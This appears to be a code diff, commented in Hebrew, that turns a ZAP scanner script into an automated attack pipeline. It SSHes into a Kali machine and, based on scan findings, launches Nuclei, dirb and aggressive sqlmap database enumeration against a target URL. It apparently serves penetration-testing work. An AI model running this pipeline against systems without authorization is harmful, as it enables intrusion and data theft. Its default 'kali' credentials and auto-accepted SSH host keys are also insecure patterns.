@@ -5,6 +5,9 @@ from pathlib import Path
 from urllib.parse import urlparse
 
 from dotenv import load_dotenv
+import paramiko
+import threading
+import json
 
 try:
   from zapv2 import ZAPv2
@@ -147,6 +150,116 @@ def announce_sqlmap_placeholder(kali_ip: str) -> None:
 
   os.system(f'echo "SQL Injection detected. Would now launch sqlmap on the Kali machine {kali_ip}."')
 
+def run_remote_sqlmap(target_url: str, kali_ip: str) -> None:
+    print(f"\n[!] Initiating automated SQLMap attack on: {target_url}")
+    
+    # משיכת פרטי ההתחברות מהקובץ
+    username = os.getenv("KALI_USER", "kali")
+    password = os.getenv("KALI_PASSWORD", "kali")
+    
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    
+    try:
+        print(f"[*] Connecting to Kali ({kali_ip}) via SSH...")
+        ssh.connect(hostname=kali_ip, username=username, password=password)
+        
+        # בניית פקודת התקיפה: סריקה אוטומטית (batch) ושליפת שמות מסדי הנתונים (dbs)
+        # שמנו את ה-URL בתוך מרכאות כדי למנוע בעיות עם תווים מיוחדים
+        sqlmap_cmd = f"sqlmap -u \"{target_url}\" --batch --dbs --level=3 --risk=3 --tamper=space2comment,between --random-agent --flush-session"
+        print(f"[*] Executing payload: {sqlmap_cmd}")
+        
+        # הפעלת הפקודה ב-Kali
+        stdin, stdout, stderr = ssh.exec_command(sqlmap_cmd)
+        
+        # קריאת הפלט (זה ייקח קצת זמן כי SQLMap רץ ברקע)
+        output = stdout.read().decode('utf-8')
+        
+        print("\n=== SQLMAP OUTPUT ===")
+        print(output)
+        print("=====================\n")
+            
+    except Exception as e:
+        print(f"[-] Automated attack failed: {e}")
+    finally:
+        ssh.close()
+
+def run_remote_dirb(target_url: str, kali_ip: str) -> None:
+    print(f"\n[*] Launching Dirb for directory discovery on: {target_url}")
+    
+    # משיכת פרטי ההתחברות מה-.env
+    username = os.getenv("KALI_USER", "kali")
+    password = os.getenv("KALI_PASSWORD", "kali")
+    
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    
+    try:
+        print(f"[*] Connecting to Kali ({kali_ip}) via SSH...")
+        ssh.connect(hostname=kali_ip, username=username, password=password)
+        
+        # בניית הפקודה - Dirb סורק את כתובת הבסיס שמצאנו
+        dirb_cmd = f"dirb {target_url}" 
+        print(f"[*] Executing payload: {dirb_cmd}")
+        
+        # הרצה
+        stdin, stdout, stderr = ssh.exec_command(dirb_cmd)
+        output = stdout.read().decode('utf-8')
+        
+        print("\n=== DIRB OUTPUT ===")
+        print(output)
+        print("=====================\n")
+            
+    except Exception as e:
+        print(f"[-] Directory discovery failed: {e}")
+    finally:
+        ssh.close()
+
+def run_remote_nuclei(target_url: str, kali_ip: str, results_list: list) -> None:
+    print(f"\n[*] Launching Nuclei vulnerability scanner on: {target_url}")
+    
+    username = os.getenv("KALI_USER", "kali")
+    password = os.getenv("KALI_PASSWORD", "kali")
+    
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    
+    try:
+        ssh.connect(hostname=kali_ip, username=username, password=password)
+        
+        # הוספנו -silent ו--jsonl כדי לקבל פלט נקי שפייתון יכול לקרוא
+        nuclei_cmd = f"nuclei -u {target_url} -dast -no-update-templates -silent -jsonl"
+        print(f"[*] Executing payload: {nuclei_cmd}")
+        
+        stdin, stdout, stderr = ssh.exec_command(nuclei_cmd)
+        
+        # קוראים את הפלט שורה אחר שורה
+        for line in stdout:
+            try:
+                data = json.loads(line.strip())
+                # ממירים את הפורמט של Nuclei לפורמט שדומה ל-ZAP כדי שהנתב יבין
+                finding = {
+                    "alert": data.get("info", {}).get("name", "Nuclei Finding"),
+                    "url": data.get("matched-at", target_url),
+                    "risk": data.get("info", {}).get("severity", "Unknown").capitalize(),
+                    "source": "Nuclei"
+                }
+                results_list.append(finding)
+            except json.JSONDecodeError:
+                continue # מתעלמים משורות שאינן JSON תקין
+                
+        print(f"[+] Nuclei scan completed. Found {len(results_list)} issues.")
+            
+    except Exception as e:
+        print(f"[-] Nuclei scan failed: {e}")
+    finally:
+        ssh.close()
+
+EXPLOIT_ROUTER = {
+    "sql injection": run_remote_sqlmap,
+    # "default credentials": run_remote_hydra,  
+    # "cross site scripting": run_remote_xss_tool 
+}
 
 def main() -> int:
   args = parse_args()
@@ -163,6 +276,17 @@ def main() -> int:
     return 1
 
   try:
+    # === שלב 1: סריקות במקביל (ZAP + Nuclei) ===
+    print("\n[*] [PHASE 1] Starting parallel scans (ZAP and Nuclei)...")
+    
+    # ניצור רשימה ריקה שתתמלא מתוך ה-Thread של Nuclei
+    nuclei_alerts = []
+    
+    # משגרים את Nuclei שיעבוד ברקע על ה-Kali במקביל
+    nuclei_thread = threading.Thread(target=run_remote_nuclei, args=(target_url, kali_ip, nuclei_alerts))
+    nuclei_thread.start()
+
+    # בינתיים, התוכנית הראשית שלנו מריצה את ZAP
     print(f"[*] Connecting to ZAP at {DEFAULT_ZAP_PROXY}")
     zap = create_zap_client(api_key)
     print(f"[+] Connected to ZAP version {zap.core.version}")
@@ -181,14 +305,59 @@ def main() -> int:
     active_scan_id = zap.ascan.scan(target_url)
     wait_for_completion("Active Scan", zap.ascan.status, active_scan_id, args.poll_interval)
 
-    alerts = fetch_all_alerts(zap)
-    print(f"[*] Retrieved {len(alerts)} alerts from ZAP.")
-    print_alerts(alerts)
+    zap_alerts = fetch_all_alerts(zap)
+    print(f"[*] Retrieved {len(zap_alerts)} alerts from ZAP.")
+    print_alerts(zap_alerts)
 
-    if any(is_sql_injection(alert) for alert in alerts):
-      announce_sqlmap_placeholder(kali_ip)
-    else:
-      print("[*] No SQL Injection alerts were found.")
+    # ZAP סיים. עכשיו אנחנו מוודאים שגם Nuclei סיים לפני שממשיכים
+    print("\n[*] Waiting for Nuclei background scan to complete...")
+    nuclei_thread.join() 
+    print("[+] Phase 1 Complete. All scanners finished.")
+
+    # === שלב 2: איחוד הנתונים (Data Normalization) ===
+    print("\n[*] [PHASE 2] Merging findings from all scanners...")
+    # עכשיו אנחנו באמת מאחדים את שני מקורות המודיעין ל"בריכה" אחת!
+    all_findings = zap_alerts.copy() 
+    all_findings.extend(nuclei_alerts)
+    print(f"[*] Total vulnerabilities aggregated for routing: {len(all_findings)}")
+
+    # === שלב 3: הנתב - תקיפה ממוקדת (Exploitation) ===
+    print("\n[*] [PHASE 3] Routing alerts to exploit tools...")
+    
+    launched_tools = set()
+    active_attack_threads = []
+    
+    # הפעלת ברירת מחדל: Dirb לטובת גילוי נתיבים (כי ZAP לא תמיד רואה ספריות נסתרות)
+    if "run_remote_dirb" not in launched_tools:
+        print("[*] Triggering default reconnaissance: run_remote_dirb")
+        dirb_thread = threading.Thread(target=run_remote_dirb, args=(target_url, kali_ip))
+        active_attack_threads.append(dirb_thread)
+        dirb_thread.start()
+        launched_tools.add("run_remote_dirb")
+
+    # ניתוב חכם לפי ממצאים למילון הכלים (EXPLOIT_ROUTER)
+    for finding in all_findings:
+        alert_name = finding.get('alert', '').lower()
+        url = finding.get('url', '')
+        
+        for vulnerability_keyword, attack_function in EXPLOIT_ROUTER.items():
+            if vulnerability_keyword in alert_name and attack_function.__name__ not in launched_tools:
+                print(f"[*] Match! Routing '{vulnerability_keyword}' to {attack_function.__name__}")
+                
+                t = threading.Thread(target=attack_function, args=(url, kali_ip))
+                active_attack_threads.append(t)
+                t.start()
+                
+                launched_tools.add(attack_function.__name__)
+                
+    # המתנה לסיום כל כלי התקיפה והמודיעין
+    if active_attack_threads:
+        print(f"[*] Waiting for {len(active_attack_threads)} attack/recon tools to finish...")
+        for t in active_attack_threads:
+            t.join()
+
+    print("\n[+] All automated attacks have completed successfully!")
+
   except KeyboardInterrupt:
     print("\n[-] Scan interrupted by user.")
     return 130
